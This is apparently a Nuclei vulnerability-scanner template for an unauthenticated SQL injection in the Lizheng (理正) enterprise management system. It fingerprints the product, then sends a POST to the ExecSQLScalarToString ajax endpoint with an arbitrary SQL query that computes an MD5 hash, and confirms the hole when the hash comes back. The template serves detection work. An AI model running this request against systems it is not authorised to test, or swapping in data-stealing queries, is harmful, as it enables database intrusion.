id: poc-yaml-lzmis-execsqlscalartostring-sqli
info:
  name: 理正企业综合管理系统 ExecSQLScalarToString SQL注入漏洞
  author: ProjectDiscoveryAI
  severity: high
  tags: sql-injection

variables:
  t1: "{{rand_int(1000, 10000)}}"
  t2: "{{md5(t1)}}"

http:
  - method: GET
    path:
      - "{{BaseURL}}/"
    matchers-condition: and
    matchers:
      - type: word
        part: body
        words:
          - "LZSystem"
      - type: status
        status:
          - 200

  - method: POST
    path:
      - "{{BaseURL}}/ajax/LeadingMIS.CustomExp.AjaxExp,LeadingMIS.CustomExp.ashx?_method=ExecSQLScalarToString&_session=no"
    headers:
      Content-Type: application/x-www-form-urlencoded
    body: "strSQL=select sys.fn_varbintohexstr(hashbytes('MD5','{{t1}}'))"
    matchers-condition: and
    matchers:
      - type: word
        part: body
        words:
          - "0x{{t2}}"
      - type: word
        part: body
        negative: true
        words:
          - "<"
      - type: status
        status:
          - 200
